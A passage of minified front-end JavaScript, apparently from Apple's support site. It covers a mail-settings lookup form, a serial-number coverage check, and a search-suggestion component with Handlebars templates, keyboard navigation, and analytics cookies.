0===window.launchPageLevelTrackFn&&null===window.launchPageLevelTrackFn||window.launchPageLevelTrackFn(E("success",t))}n||(w(a,s),r.remove(i,"fadeInDown"),o.removeAttribute("tabindex"),void 0===window.launchPageLevelTrackFn&&null===window.launchPageLevelTrackFn||window.launchPageLevelTrackFn(E("fail",t)))}(d.xml2json(e.response).domains.domain)}),(function(e){p.hideSpinnerOnButton("as-ms-input-loader"),console.log("Service Error Handle",e)}))}),300):setTimeout((function(){w(o,s),p.hideSpinnerOnButton("as-ms-input-loader")}),300)}function b(e){var t=e.parentElement;r.remove(t,"is-error"),r.add(u(".form-message"),"hide"),u(".form-message").forEach((function(e){r.add(e,"hide")})),l(".form-message-wrapper").removeAttribute("tabindex")}function w(e,t){var n=e.parentElement,i=t.id+" as-mail-settings-note";u(".form-message").forEach((function(e){r.add(e,"hide")})),r.add(n,"is-error"),r.remove(n,"is-success"),r.remove(t,"hide"),e.setAttribute("aria-describedby",i),e.setAttribute("aria-invalid",!0),setTimeout((function(){e.focus()}),950)}function E(e,t){return{name:"mail settings lookup",type:"mail-settings-lookup",link_text:"submit",link_owner:"ac_link",status:e+"::"+t}}function k(e,t){var n="";return Object.getOwnPropertyNames(e).forEach((function(i){if("protocol"===i)n="imap"===e[i].toLowerCase()||"pop"===e[i].toLowerCase()?"incoming":"outgoing";else if("requires"===i)if(t>2){var r=Boolean(e[i])&&"macosx"===e[i].toLowerCase();n+=r?"-mac":"-ios"}else n+="-mac"})),e.hasOwnProperty("requires")||(n+="-mac"),n+="-settings"}function x(e){return e?l("#emailAddress").value.trim():l("#emailAddress").value.split(/\@/)[0].trim()}_.init=function(){this.emailForm=l("#as-input-email-wrapper"),this._userInputEmail=l("#emailAddress"),this.emailSubmitBtn=l("#as-ms-button",this.emailForm),this.emailForm&&(this.lookupInput=l("#emailAddress",this.emailForm),this._addLookupEventsListener())},_._addLookupEventsListener=function(){var e=l("#emailAddress"),t=l("#as-input-email-wrapper");o(t,"submit",g.bind(this)),e&&o(e,"input",v.bind(this)),o(this.emailSubmitBtn,"click",y.bind(this))},t.exports=function(){var e=l("#as-input-email-wrapper");e&&new m(e)}},{"../../utils/as-button-loader":507,"@marcom/ac-ajax":40,"@marcom/ac-classlist":63,"@marcom/ac-dom-events/preventDefault":76,"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-traversal/querySelector":113,"@marcom/ac-dom-traversal/querySelectorAll":114,"@marcom/ac-event-emitter":124,"@marcom/ac-object/create":185,"xml2json-light":483}],494:[function(e,t,n){"use strict";var i=e("@marcom/ac-ajax"),r=e("@marcom/ac-classlist"),o=e("@marcom/ac-dom-events/utils/addEventListener"),s=e("../../utils/as-button-loader"),a=e("@marcom/ac-object/create"),c=e("@marcom/ac-event-emitter").EventEmitter,l=e("@marcom/ac-dom-traversal/querySelector"),u=e("@marcom/ac-dom-traversal/querySelectorAll"),h=e("@marcom/ac-dom-events/preventDefault"),d=new s,p="success",f={},m=d.getLocale(),_=function(){return{init:this.init()}},v=_.prototype=a(c.prototype);function g(){var e=getComputedStyle(l(".as-sn-input-section")).width;l(".as-sn-response-section").style.maxWidth=e}function y(e){var t,n,r,o,s;h(e),t=l("#as-sn-input"),r=(n=l(".main")).hasAttribute("data-env")?n.getAttribute("data-env"):"",o=t.value.trim().toUpperCase(),d.showSpinnerOnButton("as-snl-input-loader"),d.includeContentUpdating(m),""===o&&f.FE01?w("FE01"):"author"===r&&f[o]?w(o):(s=o,!new RegExp(/^[a-zA-Z0-9]{11,12}$|^((?![8|A|B|E|I|O|S|U|Z])[a-zA-Z0-9]){8,14}$/).test(s)&&f.FE02?w("FE02"):function(e){var t=l("#as-sn-lookup"),n=t.hasAttribute("data-qp-api")?t.getAttribute("data-qp-api"):"",r={serial:e,GUID:x()+x()+"-"+x()+"-"+x()+"-"+x()+"-"+x()+x()+x()};i.post({url:n,data:JSON.stringify(r),dataType:"json"}).then((function(e){var t,n,i,r,o="",s=[],a=u(".as-sn-msg-success");if(d.hideSpinnerOnButton("as-snl-input-loader"),a)for(var c=0;c<a.length;c++)n=(n=a[c].parentElement.id).replace("as-sn-",""),s.push(n);i=void 0===e.response?e.responseText:e.response,((t=JSON.parse(i)).ERROR_CODE||t.status)&&(o=t.ERROR_CODE?t.ERROR_CODE:t.status),r=t.metadata?t.metadata:null,o&&f[o]&&(r?E(o,f[o],r):E(o,f[o]),void 0===window.launchPageLevelTrackFn&&null===window.launchPageLevelTrackFn||window.launchPageLevelTrackFn(S(o)))}),(function(e){d.hideSpinnerOnButton("as-snl-input-loader"),f.FE03&&w("FE03")}))}(o))}function b(e){h(e),k()}function w(e){setTimeout((function(){d.hideSpinnerOnButton("as-snl-input-loader"),E(e,f[e]),void 0===window.launchPageLevelTrackFn&&null===window.launchPageLevelTrackFn||window.launchPageLevelTrackFn(S(e))}),300)}function E(e,t,n){var i=l("#as-sn-input"),o=l("#as-sn-"+e),s=l(".as-sn-msg--show"),a=null,c=null,u="",h=l("#as-sn-response");if(s&&s!==o&&k(),o){var d=function(e){var t="";return l(".as-sn-msg",e).childNodes.forEach((function(e){t=e.id?t+" "+e.id:t})),t.trim()}(o);""!==d&&i.setAttribute("aria-describedby",d)}t===p?(i&&r.add(i,"form-textbox-entered"),o&&(r.add(o,"as-sn-msg--show"),i.setAttribute("aria-invalid",!1),r.add(i.parentElement,"is-success"),r.add(h,"is-success"))):(h&&(r.remove(h,"is-success"),r.add(h,"is-error")),o&&(r.add(o,"as-sn-msg--show"),i.setAttribute("aria-invalid",!0),setTimeout((function(){i.focus()}),990),r.add(i.parentElement,"is-error"))),a=(s=l(".as-sn-msg--show")).querySelector(".form-message"),s&&a.classList.contains("as-sn-msg-success")&&(s.setAttribute("tabindex","-1"),setTimeout((function(){s.focus()}),990),n&&(c=a.querySelector("a"))&&(u=(u=c.attributes.href.value).indexOf("metadata")>=0?u.slice(0,u.indexOf("metadata")-1):u,c.attributes.href.value=u.match(/\?./)?u+"&metadata="+n:u+"?metadata="+n))}function k(){var e=l("#as-sn-response");e.classList.contains("is-error")&&r.remove(e,"is-error");var t=l(".as-sn-msg--show");t&&r.remove(t,"as-sn-msg--show");var n=l("#as-sn-input");n&&(r.remove(n,"form-textbox-entered"),r.remove(n.parentElement,"is-error"),r.remove(n.parentElement,"is-success"),n.setAttribute("aria-invalid",!1),n.removeAttribute("aria-describedby")),t&&t.removeAttribute("tabindex"),d.clearContentStatus()}function x(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}function S(e){return{link_owner:"ac_link",name:"serial check",type:"serial chk",link_text:"submit",status:e,dest_url:window.location.href}}v.init=function(){var e;this.lookupForm=l("#as-sn-lookup"),this.qpSubmitBtn=l("#as-sn-button"),this.lookupForm&&(g(),l(".as-sn-response-section").style.visibility="visible",this.lookupInput=l("#as-sn-input",this.lookupForm),function(){var e,t=u(".as-sn-msg");if(t)for(var n=0;n<t.length;n++)e=(e=t[n].parentElement.id).replace("as-sn-",""),r.contains(t[n],"as-sn-msg-success")?f[e]=p:f[e]="error"}(),u(".as-sn-msg").forEach((function(t){e=1,t.childNodes.forEach((function(n){"#text"!==n.nodeName&&(n.id=t.parentElement.id+"-details"+e++)}))})),this._addLookupEventsListener())},window.addEventListener("resize",(function(){l("#as-sn-lookup")&&g()}),!0),v._addLookupEventsListener=function(){o(this.lookupForm,"submit",y.bind(this)),o(this.lookupInput,"input",b.bind(this)),o(this.qpSubmitBtn,"click",y.bind(this))},t.exports=function(){var e=l("#as-sn-lookup");e&&new _(e)}},{"../../utils/as-button-loader":507,"@marcom/ac-ajax":40,"@marcom/ac-classlist":63,"@marcom/ac-dom-events/preventDefault":76,"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-traversal/querySelector":113,"@marcom/ac-dom-traversal/querySelectorAll":114,"@marcom/ac-event-emitter":124,"@marcom/ac-object/create":185}],495:[function(e,t,n){var i=e("hbsfy/runtime");t.exports=i.template({compiler:[7,">= 4.0.0"],main:function(e,t,n,i,r){var o;return'<span class="as-search-no-results-hint">'+e.escapeExpression("function"==typeof(o=null!=(o=n.hinttext||(null!=t?t.hinttext:t))?o:n.helperMissing)?o.call(null!=t?t:{},{name:"hinttext",hash:{},data:r}):o)+"</span>\n"},useData:!0})},{"hbsfy/runtime":477}],496:[function(e,t,n){var i=e("hbsfy/runtime");t.exports=i.template({1:function(e,t,n,i,r){var o,s,a=null!=t?t:{};return'<h3 class="as-heading">\n  '+e.escapeExpression("function"==typeof(s=null!=(s=n.quickLinksHeading||(null!=t?t.quickLinksHeading:t))?s:n.helperMissing)?s.call(a,{name:"quickLinksHeading",hash:{},data:r}):s)+'\n</h3>\n\n<ul class="as-search-quickLinkList" id="as-search-quicklinks" role="listbox">\n'+(null!=(o=n.each.call(a,null!=t?t.quickLinks:t,{name:"each",hash:{},fn:e.program(2,r,0),inverse:e.noop,data:r}))?o:"")+"</ul>\n"},2:function(e,t,n,i,r){var o,s,a=null!=t?t:{},c=n.helperMissing,l="function",u=e.escapeExpression,h=e.lambda;return'  <li class="as-search-suggestion" id="as-search-quicklinks-'+u(typeof(s=null!=(s=n.index||r&&r.index)?s:c)===l?s.call(a,{name:"index",hash:{},data:r}):s)+'" role="presentation">\n    <a class="as-search-suggestion-link" href="'+u(h(null!=t?t.url:t,t))+'" data-keyboard-nav-index="'+u(typeof(s=null!=(s=n.index||r&&r.index)?s:c)===l?s.call(a,{name:"index",hash:{},data:r}):s)+'" data-targeturl="'+u(h(null!=t?t.url:t,t))+'"\n    data-analytics-resulttype="quicklink" data-analytics-resultposition=\''+u((n.inc||t&&t.inc||c).call(a,r&&r.index,{name:"inc",hash:{},data:r}))+"'\n    data-analytics-resultpagetype=\""+u(h(null!=t?t.pagetype:t,t))+'" data-analytics-searchresult="'+u(h(null!=t?t.label:t,t))+'" role="option" onclick=\'return false;\'>\n    '+(null!=(o=(n.searchTermHighlight||t&&t.searchTermHighlight||c).call(a,null!=t?t.label:t,{name:"searchTermHighlight",hash:{},data:r}))?o:"")+"\n  </a>\n</li>\n"},compiler:[7,">= 4.0.0"],main:function(e,t,n,i,r){var o;return null!=(o=n.if.call(null!=t?t:{},null!=(o=null!=t?t.quickLinks:t)?o.length:o,{name:"if",hash:{},fn:e.program(1,r,0),inverse:e.noop,data:r}))?o:""},useData:!0})},{"hbsfy/runtime":477}],497:[function(e,t,n){var i=e("hbsfy/runtime");t.exports=i.template({1:function(e,t,n,i,r){return'<span class="dividers-space">&nbsp;</span>\n'},compiler:[7,">= 4.0.0"],main:function(e,t,n,i,r){var o;return null!=(o=n.if.call(null!=t?t:{},t,{name:"if",hash:{},fn:e.program(1,r,0),inverse:e.noop,data:r}))?o:""},useData:!0})},{"hbsfy/runtime":477}],498:[function(e,t,n){var i=e("hbsfy/runtime");t.exports=i.template({1:function(e,t,n,i,r){return'<span class="as-searchterm--highlight">'+e.escapeExpression(e.lambda(t,t))+"</span>\n"},compiler:[7,">= 4.0.0"],main:function(e,t,n,i,r){var o;return null!=(o=n.if.call(null!=t?t:{},t,{name:"if",hash:{},fn:e.program(1,r,0),inverse:e.noop,data:r}))?o:""},useData:!0})},{"hbsfy/runtime":477}],499:[function(e,t,n){var i=e("hbsfy/runtime");t.exports=i.template({1:function(e,t,n,i,r){var o,s,a=null!=t?t:{};return'<h3 class="as-heading">\n  '+e.escapeExpression("function"==typeof(s=null!=(s=n.searchResultsHeading||(null!=t?t.searchResultsHeading:t))?s:n.helperMissing)?s.call(a,{name:"searchResultsHeading",hash:{},data:r}):s)+'\n</h3>\n\n<ul class="as-search-suggestionsList" id="as-search-suggestions" role="listbox">\n'+(null!=(o=n.each.call(a,null!=t?t.searchResults:t,{name:"each",hash:{},fn:e.program(2,r,0),inverse:e.noop,data:r}))?o:"")+"</ul>\n"},2:function(e,t,n,i,r){var o,s,a=null!=t?t:{},c=n.helperMissing,l=e.escapeExpression,u=e.lambda;return'  <li class="as-search-suggestion" id="as-search-suggestion-'+l("function"==typeof(s=null!=(s=n.index||r&&r.index)?s:c)?s.call(a,{name:"index",hash:{},data:r}):s)+'" role="presentation">\n    <a class="as-search-suggestion-link" href="'+l(u(null!=t?t.url:t,t))+'" data-keyboard-nav-index="'+l((n.incrementKeyboardNavIndex||t&&t.incrementKeyboardNavIndex||c).call(a,r&&r.index,{name:"incrementKeyboardNavIndex",hash:{},data:r}))+'"\n    data-analytics-event="link.component_click" data-analytics-link-component_type="search" data-analytics-link-component_name="'+l(u(null!=t?t.label:t,t))+'" data-analytics-link-url="'+l(u(null!=t?t.url:t,t))+'"\n    data-targeturl="'+l(u(null!=t?t.url:t,t))+'" data-analytics-resulttype="suggested search" data-analytics-resultpagetype="'+l(u(null!=t?t.pagetype:t,t))+'"\n    data-analytics-searchresult="'+l(u(null!=t?t.label:t,t))+'" role="option" onclick=\'return false;\'>\n      '+(null!=(o=(n.searchTermHighlight||t&&t.searchTermHighlight||c).call(a,null!=t?t.label:t,{name:"searchTermHighlight",hash:{},data:r}))?o:"")+"\n    </a>\n  </li>\n"},compiler:[7,">= 4.0.0"],main:function(e,t,n,i,r){var o;return null!=(o=n.if.call(null!=t?t:{},null!=(o=null!=t?t.searchResults:t)?o.length:o,{name:"if",hash:{},fn:e.program(1,r,0),inverse:e.noop,data:r}))?o:""},useData:!0})},{"hbsfy/runtime":477}],500:[function(e,t,n){"use strict";var i=e("@marcom/ac-classlist"),r=e("@marcom/ac-dom-events/utils/addEventListener"),o=e("@marcom/ac-dom-events/preventDefault"),s=function(){this.initialize=function(){this._searchField=document.getElementById("as-search-input"),this._suggestionsList=document.querySelectorAll(".as-search-suggestion"),this._closeButton=document.getElementById("as-search-close"),r(this._closeButton,"click",this._closeButtonEvtHndler.bind(this)),this._listEventListeners(),r(this._searchField,"keyup",this._keyup.bind(this)),r(this._searchField,"keydown",this._keydown.bind(this)),r(this._searchField,"focus",this._openDrawer.bind(this)),r(this._searchField,"blur",this._closeDrawer.bind(this))},this._listEventListeners=function(){for(var e=0;e<this._suggestionsList.length;e++)r(this._suggestionsList[e],"keypress",this._listkeypress.bind(this))},this._listkeypress=function(e){27===e.keyCode&&this._closeDrawer()},this._keyup=function(e){this._searchField=document.getElementById("as-search-input"),27===e.keyCode||""===this._searchField.value?this._closeDrawer():9===e.keyCode||(8===e.keyCode&&""===this._searchField.value?this._closeDrawer():this._openDrawer())},this._keydown=function(e){9===e.keyCode||27===e.keyCode||8===e.keyCode&&""===this._searchField.value?this._closeDrawer():this._openDrawer()},this._openDrawer=function(){i.add(this._searchField,"is-opened"),""!==this._searchField.value&&i.add(this._closeButton,"is-shown")},this._closeDrawer=function(){},this._closeButtonEvtHndler=function(e){o(e),this._closeDrawer()}};t.exports=function(){var e=new s;return e.initialize(),e}},{"@marcom/ac-classlist":63,"@marcom/ac-dom-events/preventDefault":76,"@marcom/ac-dom-events/utils/addEventListener":82}],501:[function(e,t,n){"use strict";var i=e("../../utils/as-core"),r=e("@marcom/ac-dom-events"),o=e("@marcom/ac-dom-traversal/querySelector"),s=e("@marcom/ac-dom-traversal/querySelectorAll"),a=e("@marcom/ac-classlist"),c=e("hbsfy/runtime"),l=e("@marcom/function-utils/debounce"),u=e("@marcom/ac-ajax"),h=e("../as-locale-mapping/as-locale-mapping")(),d=e("@marcom/ac-keyboard"),p=e("./as-search-toggle-classes"),f={quickLinksTemplateFn:e("./as-search-quicklinks-template.hbs"),suggestedResultsTemplateFn:e("./as-search-suggestions-template.hbs"),noResultsTemplateFn:e("./as-search-no-results-template.hbs"),searchTermHighlightTemplateFn:e("./as-search-searchterm-highlight-template.hbs"),searchResultsDividerFn:e("./as-search-results-divider-space-template.hbs"),hintText:o("#as-search-form")&&o("#as-search-form").getAttribute("data-no-results-hint-text"),quickLinksHeading:o("#as-search-form")&&o("#as-search-form").getAttribute("data-quick-links-heading"),suggestedResultsHeading:o("#as-search-form")&&o("#as-search-form").getAttribute("data-suggested-results-heading")},m=!1,_=new i,v=function(){g.searchEndPoint="",g._currentKeyboardIndex=-1,g._totalNumberOfResults=0,this.init=function(){if(this._initFormEscape(),this._constructSearchEndPointAndPayload()){p();var e=o(".search-hint-class");e&&(e.id="search-hint"),c.registerHelper("inc",(function(e,t){return parseInt(e)+1})),this._respondToKeyboardEvents(),this._respondToMouseClicksOutsideSearchSection(),this._initReset()}},this.payload={}},g=v.prototype;g._constructSearchEndPointAndPayload=function(){var e=o("#as-search-form");if(e){g.searchEndPoint=e.attributes["data-suggestions-endpoint"]&&e.attributes["data-suggestions-endpoint"].value;var t=o("#as-search-locale"),n=t&&t.value,i=h.fetchSearchLocale(n);t.value=i;var r=o("#src")&&o("#src").value;return this.payload={query:"",id:"",src:r,locale:i},this.payload}return!1},g._respondToMouseClicksOutsideSearchSection=function(){var e=o("body");r.addEventListener(e,"click",(function(e){e=e||window.event,l((function(e){var t=o("#as-search-input"),n=o("#as-search-suggestions-wrapper.as-search-suggestions"),i=o(".as-search-form-reset");if(a.contains(n,"is-expanded")){if(e.srcElement)var r=e.srcElement;else e.target&&(r=e.target);var s;do{if(r===n||r===t||r===i||r.parentNode===i){s=!0;break}s=!1,r=r.parentNode}while(r);!s&&m&&g._hideSuggestionsBox()}}),250)(e)}))},g._generateSearchComponentObj=function(e){var t,n=r.target(e),i={};t=null!==(n=o('[data-keyboard-nav-index="'+g._currentKeyboardIndex+'"]'))?n.dataset:"SPAN"===e.target.tagName?e.currentTarget.querySelector("a").dataset:e.target.dataset;var s=e.keyCode;"focusin"===e.type?(i.name="click-search-component",i.link_type="acs",i.link_text="internal search",i.link_owner="ac_link"):s!==_.keys.RETURN&&"submit"!==e.target.type||null!==n||"A"===e.target.tagName?(i.location="component",i.link_type=t.analyticsResulttype,i.link_text=t.analyticsSearchresult,i.link_index=t.analyticsResultposition,i.dest_url=t.targeturl,i.dest_platform=this._determineResultsPageType(t.targeturl),i.dest_url_type="int",i.link_owner="ac_link"):(i.location="component",i.link_type="user",i.link_text=o("#as-search-input").value,i.dest_url=o("#as-search-form").getAttribute("action"),i.link_owner="ac_link"),void 0===window.launchPageLevelTrackFn&&null===window.launchPageLevelTrackFn||!i.link_text.trim()||window.launchPageLevelTrackFn(i,"search")},g._respondToKeyboardEvents=function(){this.searchInput=o("#as-search-input");var e=o("#as-search-suggestions-wrapper"),t=this,n=o("body");r.addEventListener(this.searchInput,"focusin",(function(e){var n=t.searchInput.value;t._fetchSearchSuggestions(n),t._generateSearchComponentObj(e)})),r.addEventListener(this.searchInput,"keyup",(function(e){r.preventDefault(e),l((function(e){var n=t.searchInput.value;t.resetButton=o(".as-search-form-reset"),n.length?a.add(t.resetButton,"is-shown"):a.remove(t.resetButton,"is-shown"),t._changeSubmitButtonState(n.trim()?"enable":"disable"),t._initSearchOrEscape(e,n)}),100)(e)})),r.addEventListener(this.searchInput,"keydown",(function(e){var t=e.keyCode;t===_.keys.UP||t===_.keys.DOWN?r.preventDefault(e):t===_.keys.RETURN&&(r.preventDefault(e),g._generateSearchComponentObj(e),g._omnitureAndRedirect(e))})),r.addEventListener(n,"focusout",(function(n){if(n=n||window.event,a.contains(e,"is-expanded")){var r=o("#as-search-input"),c=o(".as-search-form-submit"),l=s(".as-search-suggestion-link"),u=l[l.length-1],h=l[l.length-2];if(n.srcElement)var d=n.srcElement;else n.target&&(d=n.target);if(n.relatedTarget)var p=n.relatedTarget;(d&&d===u&&p!==h||d===r&&-1===l.indexOf(p)&&p!==c&&p!==i)&&t._hideSuggestionsBox()}})),r.addEventListener(this.searchInput,"blur",(function(){var e=s(".as-search-suggestion");e&&0===e.length&&t._hideSuggestionsBox()})),r.addEventListener(e,"keyup",(function(e){r.preventDefault(e),l((function(e){var n=t.searchInput.value;t._initSearchOrEscape(e,n)}),100)(e)}));var i=o(".as-search-form-reset");r.addEventListener(i,"keyup",(function(e){l((function(e){var n=window.event?window.event.keyCode:e.keyCode;n!==_.keys.RETURN&&n!==_.keys.SPACE||(t._changeSubmitButtonState("disable"),t.searchInput.value="",t.searchInput.focus(),t._fetchSearchSuggestions(""),a.add(t.searchInput,"is-opened"),a.remove(i,"is-shown"))}),200)(e)}))},g._initSearchOrEscape=function(e,t){try{var n;switch(window.event?window.event.keyCode:e.keyCode){case _.keys.ESC:this._hideSuggestionsBox();break;case _.keys.RETURN:(g._totalNumberOfResults>0||g._currentKeyboardIndex>0)&&(g._generateSearchComponentObj(e),this._omnitureAndRedirect(e));break;case _.keys.UP:n=document.activeElement,a.contains(n,"as-search-suggestion-link")||(g._totalNumberOfResults>0&&g._currentKeyboardIndex>-1&&(g._currentKeyboardIndex=parseInt(g._currentKeyboardIndex)-1,this._highlightResult(g._currentKeyboardIndex,e)),-1===g._currentKeyboardIndex&&(this._lowlightResult(),this.searchInput.value=this.payload.query));break;case _.keys.DOWN:n=document.activeElement,a.contains(n,"as-search-suggestion-link")||g._totalNumberOfResults>0&&g._currentKeyboardIndex<g._totalNumberOfResults&&g._currentKeyboardIndex!==g._totalNumberOfResults-1&&(g._currentKeyboardIndex=parseInt(g._currentKeyboardIndex)+1,this._highlightResult(g._currentKeyboardIndex,e));break;case _.keys.LEFT:case _.keys.RIGHT:case _.keys.TAB:this._lowlightResult();break;case _.keys.SHIFT:case _.keys.ALT:case _.keys.CTRL:case _.keys.MAC_CMD_LEFT:case _.keys.MAC_CMD_RIGHT:case _.keys.MAC_CMD_FIREFOX:case _.keys.CAPS_LOCK:case _.keys.WINDOWS_KEY:break;default:this._unhideSuggestionsBox(),null!==t?this._fetchSearchSuggestions(t):this._hideSuggestionsBox()}}catch(e){d.onceDown(_.keys.RETURN,(function(){o("#as-search-form").submit()}))}},g._fetchSearchSuggestions=function(e){this._generateSearchTermHighlightFunction(e);var t=g.searchEndPoint;this.payload.query=e;var n=this;u.post({url:t,data:JSON.stringify(this.payload),dataType:"json",headers:[{name:"Content-Type",value:"application/json"}]}).then((function(e){var t;t=void 0===e.response?e.responseText:e.response,n._renderSuggestionsBox(JSON.parse(t).results)}),(function(e){throw e}))},g._renderSuggestionsBox=function(e){if(this._unbindMouseActionsToSuggestions(),e.length>0){var t=[],n=[];e.forEach((function(e){"quickLinks"===e.sectionName?t=e.sectionResults:"suggestions"===e.sectionName&&(n=e.sectionResults)})),c.registerHelper("incrementKeyboardNavIndex",(function(e){var n=t.length;return parseInt(e)+parseInt(n)})),g._currentKeyboardIndex=-1,g._totalNumberOfResults=t.length+n.length,g._totalNumberOfResults>0?this._renderQuickLinksSuggestedSearches(t,n):this._renderNoResultsHintText();var i=o("#as-search-suggestions-wrapper"),r=o("#as-search-input");a.add(i,"is-expanded"),a.add(r,"is-focus-active"),setTimeout((function(){g._populateAriaLiveSpan(t,n)}),1e3),this._bindMouseActionsToSuggestions()}else this._renderNoResultsHintText()},g._populateAriaLiveSpan=function(e,t){var n=o("#as-search-suggestions-wrapper"),i=o("span",n);i&&(e.length>0&&t.length>0?i.innerHTML=e.length+" "+f.quickLinksHeading+","+t.length+" "+f.suggestedResultsHeading:e.length>0&&0===t.length?i.innerHTML=e.length+" "+f.quickLinksHeading:0===e.length&&t.length>0?i.innerHTML=t.length+" "+f.suggestedResultsHeading:i.innerHTML=f.hintText,setTimeout((function(){g._clearAriaLiveSpan()}),3e3))},g._clearAriaLiveSpan=function(){var e=o("#as-search-suggestions-wrapper"),t=o("span",e);t&&""!==t.innerHTML&&(t.innerHTML="")},g._renderQuickLinksSuggestedSearches=function(e,t){this._renderResultsTemplate(f.noResultsTemplateFn,".as-search-results-section-no-results",{}),this._renderResultsTemplate(f.quickLinksTemplateFn,".as-search-results-section-quicklinks",{quickLinksHeading:f.quickLinksHeading,quickLinks:e}),e.length>0&&t.length>0?this._renderResultsTemplate(f.searchResultsDividerFn,".as-search-results-section-divider-space",["spacer"]):this._renderResultsTemplate(f.searchResultsDividerFn,".as-search-results-section-divider-space",[]),this._renderResultsTemplate(f.suggestedResultsTemplateFn,".as-search-results-section-suggestions",{searchResultsHeading:f.suggestedResultsHeading,searchResults:t})},g._renderNoResultsHintText=function(){this._renderResultsTemplate(f.suggestedResultsTemplateFn,".as-search-results-section-suggestions",{sectionResults:[]}),this._renderResultsTemplate(f.quickLinksTemplateFn,".as-search-results-section-quicklinks",{sectionResults:[]}),this._renderResultsTemplate(f.noResultsTemplateFn,".as-search-results-section-no-results",{hinttext:f.hintText}),this._renderResultsTemplate(f.searchResultsDividerFn,".as-search-results-section-divider-space",[])},g._renderResultsTemplate=function(e,t,n){if(e){var i=e(n),r=o(t);r&&(r.innerHTML=i)}return!0},g._hideSuggestionsBox=function(){g._currentKeyboardIndex=-1,g._totalNumberOfResults=0;var e=o("#as-search-suggestions-wrapper"),t=o("#as-search-input");a.remove(e,"is-expanded"),a.remove(t,"is-focus-active");var n=o("#as-search-input");a.remove(n,"is-opened"),e.children[0].textContent="",this._unbindMouseActionsToSuggestions()},g._unhideSuggestionsBox=function(){var e=o("#as-search-suggestions-wrapper");a.contains(e,"is-expanded")||a.add(e,"is-expanded")},g._bindMouseActionsToSuggestions=function(){var e=this,t=o(".as-search-suggestions"),n=s(".as-search-suggestion");r.addEventListener(t,"mousedown",(function(e){m=!0,e.preventDefault()})),r.addEventListener(t,"mousemove",(function(e){m=!1,e.preventDefault()})),r.addEventListener(t,"click",(function(e){m?g._omnitureAndRedirect(e):e.preventDefault()})),n&&n.forEach((function(t,n){r.addEventListener(t,"mouseenter",(function(t){e._highlightResult(n,t)})),r.addEventListener(t,"mouseleave",(function(t){e._lowlightResult()})),r.addEventListener(t,"mousedown",(function(t){e._generateSearchComponentObj(t)}))}))},g._unbindMouseActionsToSuggestions=function(){var e=o(".as-search-suggestions");r.removeEventListener(e,"click",(function(e){g._omnitureAndRedirect(e)}))},g._highlightResult=function(e,t){var n=this,i=o(".as-search-suggestion.is-selected");i&&a.remove(i,"is-selected");var s=o('[data-keyboard-nav-index="'+e+'"]');if(s){var c=s.parentElement;a.add(c,"is-selected"),r.preventDefault(t),"mouseenter"!==t.type&&("suggested search"===s.attributes["data-analytics-resulttype"].value?n.searchInput.value=s.attributes["data-analytics-searchresult"].value:n.searchInput.value=n.payload.query)}},g._lowlightResult=function(){var e=o(".as-search-suggestion.is-selected");e&&a.remove(e,"is-selected")},g._getLocale=function(){return this.payload?this.payload.locale?this.payload.locale:"":"en_US"},g._initReset=function(){var e=this,t=o(".as-search-form-reset");r.addEventListener(t,"mousedown",(function(n){r.preventDefault(n),e._changeSubmitButtonState("disable"),e.searchInput.value="",e.searchInput.focus(),e._fetchSearchSuggestions(""),a.add(e.searchInput,"is-opened"),a.remove(t,"is-shown")}))},g._changeSubmitButtonState=function(e){var t=o(".as-search-form-submit");"disable"===e?(t.disabled=!0,t.style.opacity=".4",a.remove(t,"clickable")):(t.disabled=!1,t.style.opacity="1",a.add(t,"clickable"))},g._initFormEscape=function(){var e=o(".as-search-form-submit"),t=o("#as-search-form"),n=this;e&&(n._changeSubmitButtonState("disable"),r.addEventListener(e,"click",(function(e){r.preventDefault(e),n.searchInput.value.trim()&&(n._generateSearchComponentObj(e),t.submit())})))},g._generateSearchTermHighlightFunction=function(e){return c.registerHelper("searchTermHighlight",(function(t,n){var i=new RegExp(e,"i");if(void 0!==t){if(i.test(t)){var r=f.searchTermHighlightTemplateFn(i.exec(t)[0]);return t.replace(i,r.trim())}return t}})),!0},g._omnitureAndRedirect=function(e){r.stopPropagation(e),r.preventDefault(e);var t=r.target(e);if("as-search-no-results-hint"===t.className)return!1;if("keydown"===e.type&&null==(t=o('[data-keyboard-nav-index="'+g._currentKeyboardIndex+'"]'))&&e.keyCode===_.keys.RETURN&&o("#as-search-input").value.trim()&&o("#as-search-form").submit(),t&&"span"!==t.localName&&"a"!==t.localName);else if(t&&"span"===t.localName&&(t=t.parentElement),t){var n,i=new Date,a=g._getLocale();t.getAttribute("data-analytics-resultpagetype")&&t.getAttribute("data-analytics-resultpagetype"),i.setTime(i.getTime()+864e5);var c=";expires="+i.toGMTString(),l=encodeURIComponent("acs::"+t.getAttribute("data-analytics-resulttype")+"::"+t.getAttribute("data-analytics-searchresult"));if(document.cookie="acs_prop7="+l+c+"; domain=apple.com; path=/","quicklink"===t.getAttribute("data-analytics-resulttype")&&(n=encodeURIComponent("acs::search result::"+t.getAttribute("data-analytics-resulttype")+"::"+g._determineResultsPageType(t.getAttribute("data-targeturl"))+"::"+t.getAttribute("data-analytics-resultposition")+"::"+a.toLowerCase()),document.cookie="acs_evar5="+n+c+"; domain=apple.com; path=/"),"suggested search"===t.getAttribute("data-analytics-resulttype")){var u=s('[data-analytics-resulttype="quicklink"]'),h=0;u&&(h=u.length);var d=parseInt(t.getAttribute("data-keyboard-nav-index"))+1-h,p=t.getAttribute("data-targeturl")+"&feedType=suggested&position="+d}else p=t.getAttribute("data-targeturl");return window.location=p,!0}},g._determineResultsPageType=function(e){if(void 0!==(e=e.toLowerCase()))return-1!==e.indexOf("support")?-1!==e.indexOf("/ht")?"kbase":"supportpage":-1!==e.indexOf("getsupport")||-1!==e.indexOf("selfsolve")?"selfsolve tool":-1!==e.indexOf("discussions")?"discussions":-1!==e.indexOf("tips")?"tips&tricks":-1!==e.indexOf("manuals")?"manuals":-1!==e.indexOf("shop")||-1!==e.indexOf("store")?"aos":-1!==e.indexOf("reportaproblem")?"report a 